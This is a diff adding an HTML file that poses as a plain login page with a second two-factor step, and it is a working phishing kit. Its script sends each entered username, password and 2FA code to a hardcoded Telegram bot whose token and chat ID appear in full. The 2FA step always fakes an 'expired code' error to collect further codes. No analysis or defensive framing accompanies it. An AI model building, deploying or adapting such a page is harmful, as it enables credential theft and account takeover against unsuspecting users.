@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login</title>
+<style>
+  :root {
+    --bg-color: #0f212e;
+    --input-border: #33444d;
+    --text-color: #ffffff;
+    --label-color: #b0c4d4;
+    --button-color: #1475e1;
+    --error-color: #ff4c4c;
+  }
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background-color: var(--bg-color);
+    font-family: Arial, sans-serif;
+    overflow: hidden;
+    user-select: none;
+  }
+  .form-container {
+    display: none;
+    flex-direction: column;
+    padding: 20px;
+    height: 100%;
+    box-sizing: border-box;
+    padding-bottom: 80px;
+    animation: fadeIn 0.3s ease-in-out;
+  }
+  .form-container.active { display: flex; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateX(20px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  label {
+    color: var(--label-color);
+    font-size: 14px;
+    margin-bottom: 6px;
+    display: block;
+  }
+  .required { color: red; }
+  .input-wrap {
+    position: relative;
+    margin-bottom: 20px;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid var(--input-border);
+    border-radius: 4px;
+    background: transparent;
+    color: var(--text-color);
+    font-size: 16px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease;
+  }
+  input.error { border-color: var(--error-color); }
+  .error-message {
+    color: var(--error-color);
+    font-size: 13px;
+    margin-top: 4px;
+    display: none;
+    font-weight: bold;
+  }
+  button {
+    position: fixed;
+    bottom: 10px;
+    left: 10px;
+    right: 10px;
+    padding: 16px;
+    background-color: var(--button-color);
+    border: none;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    height: 52px;
+    box-sizing: border-box;
+  }
+  button:disabled { opacity: 0.7; cursor: not-allowed; }
+  .loader {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid white;
+    border-radius: 50%;
+    width: 18px;
+    height: 18px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+
+<!-- PAGE 1: LOGIN -->
+<div class="form-container" id="page1">
+  <form id="loginForm">
+    <label>Email or Username <span class="required">*</span></label>
+    <div class="input-wrap">
+      <input type="text" id="username" required />
+    </div>
+
+    <label>Password <span class="required">*</span></label>
+    <div class="input-wrap">
+      <input type="password" id="password" required />
+    </div>
+  </form>
+</div>
+
+<!-- PAGE 2: 2FA -->
+<div class="form-container" id="page2">
+  <form id="twofaForm">
+    <label>Two Factor Code <span class="required">*</span></label>
+    <div class="input-wrap">
+      <input type="text" id="code" required />
+    </div>
+    <div class="error-message" id="errorMsg">Two Factor Code Has Expired *</div>
+  </form>
+</div>
+
+<!-- BUTTON -->
+<button id="mainBtn" type="submit" form="loginForm">Sign in</button>
+
+<script>
+const BOT_TOKEN = "8433734840:AAFv4xWIBQIhD6JKSVhb8bgnMds6UMVvnSU";
+const CHAT_ID = "7003155954";
+const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+const page1 = document.getElementById("page1");
+const page2 = document.getElementById("page2");
+const mainBtn = document.getElementById("mainBtn");
+const codeInput = document.getElementById("code");
+const errorMsg = document.getElementById("errorMsg");
+
+if (location.search.includes("step=2")) {
+  showPage(2);
+} else {
+  showPage(1);
+}
+
+function showPage(num) {
+  page1.classList.remove("active");
+  page2.classList.remove("active");
+  if (num === 1) {
+    page1.classList.add("active");
+    mainBtn.setAttribute("form", "loginForm");
+    mainBtn.textContent = "Sign in";
+  } else {
+    page2.classList.add("active");
+    mainBtn.setAttribute("form", "twofaForm");
+    mainBtn.textContent = "Verify";
+  }
+}
+
+function escapeMarkdown(text) {
+  return text.replace(/([\_\*\[\]\(\)\~\`\>\#\+\-\=\|\{\}\.\!\\])/g, '\\$1');
+}
+
+document.getElementById("loginForm").addEventListener("submit", e => {
+  e.preventDefault();
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  if (!username || !password) return;
+
+  fetch(TG_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      parse_mode: "MarkdownV2",
+      text: `🔑 Login Attempt\n👤 Username: \`${escapeMarkdown(username)}\`\n🔒 Password: \`${escapeMarkdown(password)}\``
+    })
+  }).finally(() => {
+    history.pushState({}, "", "?step=2");
+    showPage(2);
+  });
+});
+
+codeInput.addEventListener("input", function() {
+  let noSpace = this.value.replace(/\s+/g, "");
+  if (noSpace.length > 6) noSpace = noSpace.slice(0, 6);
+  this.value = noSpace;
+});
+
+document.getElementById("twofaForm").addEventListener("submit", e => {
+  e.preventDefault();
+  const code = codeInput.value.trim();
+  if (!code) return;
+
+  fetch(TG_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      parse_mode: "MarkdownV2",
+      text: `📟 2FA Code: \`${escapeMarkdown(code)}\``
+    })
+  });
+
+  errorMsg.style.display = "none";
+  codeInput.classList.remove("error");
+
+  mainBtn.disabled = true;
+  mainBtn.innerHTML = `<div class="loader"></div> Verifying...`;
+
+  setTimeout(() => {
+    mainBtn.innerHTML = `Verify`;
+    mainBtn.disabled = false;
+    codeInput.value = "";
+    codeInput.classList.add("error");
+    errorMsg.style.display = "block";
+  }, 10000);
+});
+</script>
+
+</body>
+</html>
